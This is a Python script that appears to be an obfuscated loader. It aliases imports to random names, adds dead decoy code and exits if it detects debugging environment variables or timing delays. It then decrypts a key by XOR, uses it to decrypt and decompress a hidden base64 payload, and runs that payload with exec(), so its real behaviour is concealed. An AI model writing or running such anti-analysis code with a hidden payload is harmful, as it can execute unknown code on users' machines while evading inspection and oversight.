
import base64 as nxfpbDpt, zlib as vruLPFwx, marshal as cPDGzmQc, hashlib as __h, os as YQnSSjby, sys as dFYuDKJp, time as ZsiWDKOR

cZgQfosF = 1236
jMAFlajW = 'Jb4YoWbvjhIw'
LcsxJElH = lambda x: x

def qjzGVUbG():
    x = 0
    for i in range(5):
        x += i
    return x


FhQgDzGB = [51, 20, 1, 2, 12, 5, 43, 15, 4, 9, 82, 81, 51, 1, 12, 20, 51, 20, 18, 9, 14, 7, 15, 53, 55, 54]
VAOtPSax = 96
LewLiqPV = ''.join(chr(b ^ VAOtPSax) for b in FhQgDzGB)
iEOoyhGF = __h.sha256(LewLiqPV.encode()).digest()

def IVPjZtlZ():
    suspicious = ['PYTHONINSPECT', 'PYTHONDEBUG', 'PYTHONVERBOSE']
    for v in suspicious:
        if YQnSSjby.environ.get(v):
            dFYuDKJp.exit(1)
    t1 = ZsiWDKOR.time()
    ZsiWDKOR.sleep(0.1)
    t2 = ZsiWDKOR.time()
    if t2 - t1 > 0.5:
        dFYuDKJp.exit(1)

IVPjZtlZ()

ikOKIbIK_data = ["Kp/GAz/c6xxToaXqecLthvUMUEeQyZ9vXs93a2/Tb6ivwwBvE6cE24n5mp0l4iLtSt3GkQyWLClNB8OiC4D6fy6nIb3fhctzPhfVMNcm2FK50pmT3GbfaYCG", "xms9Kpuei4mat78BbS7RKgG2frQn/IDCvpCupQRwA44HX2BeCMGtxgWMHKD2wQzuAUnCqB6GLbUW1ODRYoRpFKAved2gwDlBaunsjwm8pgaVcriCOGrKn+GH", "5pL4p+uIkB9jl7dDCOkrMGPQbaZ7QTQ8zs06dUa1byafwnQeXaGk6lqiHd633qNAaWdtcH/aacLTw7yRvhOq3CRQtwRdcIAFUL7V8BJAybNoDMQqWw6WAQ99", "EXUKSVgUH+NRWt4y+OeBObSF18ooh009TPjZ9RiPZpI4D6jJ2uXF2gqhYB6pEwWbeCCFlCMMKuuxY0jbNB4eayNoF95/Rgw+ArkVPr7E8EKpep2MgsHLNuK6", "sbX0PQxC59BalsSXRMvyP7txezWdKCO0yo3UYuHcRyjbPFN6PD6IjsVSwJACP9JqBDEA3L2puFtwijKQFSKAZBYn4o4tr6bErhVX+KwHo+0sVYmsOWIprri9", "edXNmT7x/iHCHfptWrQHsQ9ZqoVlNkhufJ6reGwBXcc3iGNkRCYXPWP9uIcuLQ+pjrkdwn9LDCKPSjRjLVTDPDKI9szJoG1DZLkizkzSHtxwOOZ/LewV84Wn", "tuiL7gatJri6mrsqM/C4DE4pTIqrfROExfO1sbI39ee+Kl48z2pXuf0Tgy6C6WQnfjyB0gY5JooL7g81YFedaYzWi8GOgJkpU3EOjoPBK/qHa+S/v5QqwxG0", "OIn9/HEp7KlqcZaFOmdl88GLaKM01Gq1LdAiodCWceA3SpGRycOZ7CUZSSyIBVGsmoxCLPWH6U2MStKPXHEyMEEkHiqbouu2KtfHOPaKlFIqlTTdiuYW/w39", "dH8a+ViWHiy0bts1P6uH+01VvDxuctlu+eQPFIlc/znrSPJiimw8FgK5+GhBsIWorlFqnKQm2vOOH4JERxs0NfZe6PhP0eSu1JC5nGPE+ds6pEwxmiukFXnW", "GR/1l8N9U3EiuP4HmXli5leZfqjco1URVJafT+HDIK/YMAxoLEZ93QEU8LJ7CGKU1E54F9JZ8ELusj3gsO9B0a0vLcuxoTtEF4M2GZWxH/BiWskvVK2kvjvi", "NGNcbYHx+EmTDakN/Hr+BhrghwNKvZFqEZkTOuMJEA4YHOA7H7H+PLoESui5Da4K3PItLydEEpDdIvJ9jIKd7JjWU/7HVipTh7QGF58/dhFzFfsMD1KWjHuE", "XXv9nQdLr5wFY/TZyNYbzx7fX+Y2A8Tlmz5qdtptXL6uOY2Ml9tD+CvjfV1Pv0gzcMYE9wtP69yVlxPFLeIfs+U92lw++s5BnHiw3gKJrpiP6Qsnbkgl9Lvt", "/VkmDC66ofkEbN85joH8p/hFHq64PwnEGsqaNFjcHjxdi8JCuw+xm7moTusDBJuNwMtfk3X4U8beWqHTAxQ84wvDMT49uVYj42ChWteB3mGJY4jfAuFGiOIT", "9Nxna8mCjYe/AQJKyfHxFtXjT+85ykS0rPmn0RIif+9ebuGRXsIPFi316rUEn0zRHtDO2Bd5kBCqnO5ZoITuaBvdBsvQv+RZ3m6QEBECa0q6Ym7hLQEFmfAz", "elj/u7x3TFBGC/VAZulysNxoYDLPfYyb6QNS9b60u/gIbtcfiwJ9eKs+ZFgNJWqungbtcIIIw+JEr4tprbaNkpXvmjWe0sTmB53+bZH8n/tKVDTF3DEKCPuI", "d5CWf/gmpMfA0OEcx/Uop0Ogiy1XYgFUCACe8knuWYdyNmJHDCG5JrAfDaiMSv96IbN+JaLovzq605yKQge+oJDKxFCgPeFKP5fXx/JQfrncAWqsnUC34qOl", "ybhKkjQxngC4NeEH3bJLw4vSRsdDmU7ltaI0A3QxlCjUvdrfEVgMR9hcuoGppCs/3qMzXMasUTFNHd5KKhP0Jb+FJrStpTbQbHiTKngfbUfy7K9w7mGs632N", "7d1+QEqr5v44fsr4A2EN/LbJ8YGczTzuUaA02UTdhX5ef01KWmnio+KxOOVvXMdX3CXOsGZhV1ebwbpT/twLsiHAExO0cwe1ZRxcpbQ9y9o6ZzXJ1guwLeJD", "UbEPshd1LdiNNHvNQ8wOeP5SJ62M7Ji/dgNRJy0="]
ikOKIbIK_key = ["8xEAAAAenydIpnlH/h9LnaatMRzdPA=="]

ikOKIbIK_data_joined = ''.join(ikOKIbIK_data)
ikOKIbIK_key_joined = ''.join(ikOKIbIK_key)

APVKcuVX = nxfpbDpt.b64decode(ikOKIbIK_key_joined)
JUpNaXlk = cPDGzmQc.loads(APVKcuVX)
Thgnjxpt = bytes([b ^ iEOoyhGF[i % len(iEOoyhGF)] for i, b in enumerate(JUpNaXlk)]).decode()

ikOKIbIK_enc = nxfpbDpt.b64decode(ikOKIbIK_data_joined)
TTwUhhcY = bytes([b ^ ord(Thgnjxpt[i % len(Thgnjxpt)]) for i, b in enumerate(ikOKIbIK_enc)])
kcmjoRgn = vruLPFwx.decompress(TTwUhhcY)

if 1 == 2:
    print("This never runs")
while False:
    print("Nor does this")
try:
    assert 1 == 0
except:
    pass

exec(kcmjoRgn)
